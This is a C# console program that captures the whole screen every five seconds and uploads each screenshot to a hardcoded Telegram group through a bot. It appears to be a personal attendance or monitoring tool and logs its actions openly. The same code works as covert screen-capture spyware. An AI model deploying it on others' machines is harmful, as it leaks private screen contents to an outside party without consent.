// See https://aka.ms/new-console-template for more information
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using System.Windows.Forms;
using Telegram.Bot.Polling;
using Telegram.Bot.Types.Enums;
using System.Text.Json.Serialization;
using System.Xml;
using Newtonsoft.Json;

class Program
{
    private static readonly string botToken = "YOUR_BOT_TOKEN"; // 🔹 你的 Telegram 机器人 Token
    private static readonly long chatId = -4579370634; // 🔹 你的 Telegram 群组 ID  daka grp

    static async Task Main()
    {

        Console.WriteLine("Hello, World!");

        var botToken = readTxtFrmFile("../../../tok.txt");
        var botClient = new TelegramBotClient(botToken);

        Console.WriteLine("开始截图，每 5 秒发送一次...");

        //----------liston msg
        var cts = new CancellationTokenSource();
        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = new[] { UpdateType.Message } // 只监听消息
        };

        botClient.StartReceiving(
                new DefaultUpdateHandler(HandleUpdateAsync, HandlePollingErrorAsync),  // 使用 DefaultUpdateHandler

            receiverOptions: receiverOptions,
            cancellationToken: cts.Token
        );

        Console.WriteLine("✅ 机器人已启动，正在监听消息...");
     //   await Task.Delay(-1); // 让程序持续运行

        while (true)
        {
            try
            {
                string filePath = CaptureScreenshot();
                await SendToTelegram(botClient, filePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Console.WriteLine(ex.StackTrace);
            }
           
            Thread.Sleep(5000); // 每隔 5 秒执行一次
        }
    }

    // 截取屏幕截图并保存
    private static string CaptureScreenshot()
    {
        string filePath = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");

          Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
          Graphics g = Graphics.FromImage(bmp);
        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);

        bmp.Save(filePath, ImageFormat.Png);
        Console.WriteLine($"save img: {filePath}");
        return filePath;
    }


    private static async Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
    {
        if (update.Type == UpdateType.Message && update.Message != null)
        {
            var message = update.Message;
            string json = JsonConvert.SerializeObject(message, Newtonsoft.Json.Formatting.Indented);
            Console.WriteLine($"📩 get mesg JSON:\n{json}");

            // 可选：将 JSON 发送回 Telegram 群
            //await bot.SendTextMessageAsync(message.Chat.Id, "收到消息:\n" + json);
        }
    }

    private static Task HandlePollingErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"❌ err: {exception.Message}");
        return Task.CompletedTask;
    }
    static string readTxtFrmFile(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException($"文件未找到: {filePath}");

        return File.ReadAllText(filePath);
    }
    // 发送截图到 Telegram 群
    private static async Task SendToTelegram(TelegramBotClient botClient, string filePath)
    {
          var stream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
        var inputFile = InputFile.FromStream(stream, Path.GetFileName(filePath)); // ✅ 使用 InputFile 代替 InputOnlineFile
        await botClient.SendPhotoAsync(chatId, inputFile,null, "📸 截图时间：" + DateTime.Now);

      //  await botClient.SendPhotoAsync(chatId, inputOnlineFile, "📸 截图时间：" + DateTime.Now);
        Console.WriteLine("pic alrdy send to  Telegram grp");
    }
}





